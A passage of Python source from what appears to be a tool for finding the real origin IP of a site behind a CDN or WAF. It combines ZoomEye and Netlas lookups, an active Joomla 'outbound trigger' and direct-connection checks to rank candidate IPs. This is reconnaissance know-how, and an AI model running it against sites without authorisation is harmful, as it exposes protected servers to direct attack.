            techniques.append(("ZoomEye SSL", lambda: self.scan_zoomeye(hostname, zoomeye_key)))
        if netlas_key:
            techniques.append(("Netlas Response", lambda: self.scan_netlas(hostname, netlas_key)))

        for name, func in techniques:
            logger.info(f"Running: {name}")
            try:
                results = func()
                report.techniques_used += 1
                for r in results:
                    self._add_result(r.source, r.ip, r.confidence, r.details)
                    report.candidates.append(r)
            except Exception as e:
                logger.debug(f"{name} failed: {e}")

        # Run active outbound trigger LAST (takes time, but most reliable)
        logger.info("Running: Joomla Outbound Trigger (Active)")
        try:
            active_results = self.scan_joomla_outbound_trigger(hostname)
            report.techniques_used += 1
            for r in active_results:
                self._add_result(r.source, r.ip, r.confidence, r.details)
                report.candidates.append(r)
        except Exception as e:
            logger.debug(f"Joomla Outbound Trigger failed: {e}")

        # Verify top candidates with direct connection test
        unique_ips = {}
        for r in self._results:
            if r.ip not in unique_ips or r.confidence > unique_ips[r.ip].confidence:
                unique_ips[r.ip] = r

        for ip, result in unique_ips.items():
            if self.test_direct_connection(hostname, ip):
                result.verified = True
                result.confidence = min(result.confidence + 0.3, 1.0)
                result.details += " [VERIFIED]"

        # Sort by confidence
        self._results.sort(key=lambda r: r.confidence, reverse=True)
        report.candidates = self._results

        if report.verified_origin:
            report.success = True
        elif report.candidates:
            report.success = True
            # If no verified but we have candidates, mark the highest confidence as likely
            report.candidates[0].confidence = min(report.candidates[0].confidence + 0.1, 0.9)

        logger.info(f"Origin discovery complete: {len(self._results)} candidates found")
        return report

    def get_best_origin(self, report: OriginReport) -> Optional[str]:
        """Get the most likely origin IP"""
        if report.verified_origin:
            return report.verified_origin
        if report.candidates:
            return report.candidates[0].ip
        return None
